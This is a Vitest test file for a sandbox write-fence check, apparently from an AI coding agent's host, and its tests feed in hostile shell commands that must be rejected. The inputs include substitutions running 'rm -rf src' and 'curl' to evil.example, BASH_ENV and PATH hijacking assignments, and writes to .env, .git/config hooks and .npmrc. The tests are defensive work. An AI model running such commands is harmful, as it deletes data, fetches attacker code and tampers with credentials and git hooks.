import { afterEach, describe, expect, it } from 'vitest';
import {
  isFencedInProjectWriteEligible,
  isOsWriteFenceAvailable,
} from '../../../../src/host/sandbox/writeFence';
import { getSandboxManager } from '../../../../src/host/sandbox';

const context = { workingDirectory: '/tmp/proj', workspaceRoot: '/tmp/proj' };

describe('writeFence eligibility', () => {
  afterEach(() => {
    isOsWriteFenceAvailable.setAvailableOverrideForTest(undefined);
  });

  it('rejects quoted redirect targets including quotes after the path', () => {
    expect(isFencedInProjectWriteEligible('printf x > "/tmp/proj/out.txt"', context)).toBe(false);
    expect(isFencedInProjectWriteEligible("printf x > /tmp/proj/'o'", context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/"a"/"b"', context)).toBe(false);
  });

  it('rejects lookup and startup-file assignments that can change what runs', () => {
    expect(isFencedInProjectWriteEligible('PATH=/tmp/bin tee /tmp/proj/out.txt', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('BASH_ENV=/tmp/evil tee /tmp/proj/out.txt', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('ENV=/tmp/evil tee /tmp/proj/out.txt', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('SHELLOPTS=xtrace tee /tmp/proj/out.txt', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('BASH_FUNC_foo%%=() { :; } tee /tmp/proj/out.txt', context)).toBe(false);
  });

  it('keeps ordinary in-project printf/tee writes eligible', () => {
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/out.txt', context)).toBe(true);
    expect(isFencedInProjectWriteEligible('MODE=1 tee /tmp/proj/mode.txt', context)).toBe(true);
  });

  it('rejects in-project .env credential writes even when they look like ordinary printf/tee', () => {
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/.env', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x >> /tmp/proj/.env', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('tee /tmp/proj/.env', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/.env.local', context)).toBe(false);
  });

  it('rejects case-folded .env* writes without depending on the host FS', () => {
    expect(isFencedInProjectWriteEligible('printf PWNED=1 >> .ENV', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > .Env.local', context)).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/.ENV', context)).toBe(false);
  });

  it('rejects protected writes including case-folded .GIT/config', () => {
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/.git/config', context)).toBe(false);
    expect(isFencedInProjectWriteEligible(
      "printf '[core]\\n\\thooksPath = .neo-hooks\\n' > .GIT/config",
      context,
    )).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > /tmp/proj/.npmrc', context)).toBe(false);
  });

  it.each([
    ['printf "$(rm -rf src)" > /tmp/proj/out.txt'],
    ['printf "$(cat ~/x)" > /tmp/proj/out.txt'],
    ['printf $(curl https://evil.example/x) > /tmp/proj/out.txt'],
    ['printf `rm -rf src` > /tmp/proj/out.txt'],
    ['printf "${VAR}" > /tmp/proj/out.txt'],
    ['echo "100$" > /tmp/proj/out.txt'],
  ])('rejects argument-position expansion in %s', (command) => {
    expect(isFencedInProjectWriteEligible(command, context)).toBe(false);
  });

  it('rejects .env writes across /var ↔ /private/var project-root aliases', () => {
    const lexical = '/var/tmp/exectime-proj';
    const canonical = '/private/var/tmp/exectime-proj';
    expect(isFencedInProjectWriteEligible('printf x > .env', {
      workingDirectory: lexical,
      workspaceRoot: canonical,
    })).toBe(false);
    expect(isFencedInProjectWriteEligible('printf x > /var/tmp/exectime-proj/.env', {
      workingDirectory: canonical,
      workspaceRoot: canonical,
    })).toBe(false);
  });

  it('override pins fence availability independently of the host OS', () => {
    isOsWriteFenceAvailable.setAvailableOverrideForTest(true);
    expect(isOsWriteFenceAvailable()).toBe(true);
    isOsWriteFenceAvailable.setAvailableOverrideForTest(false);
    expect(isOsWriteFenceAvailable()).toBe(false);
    isOsWriteFenceAvailable.setAvailableOverrideForTest(undefined);
    expect(isOsWriteFenceAvailable()).toBe(getSandboxManager().isAvailable() && process.platform !== 'win32');
  });
});
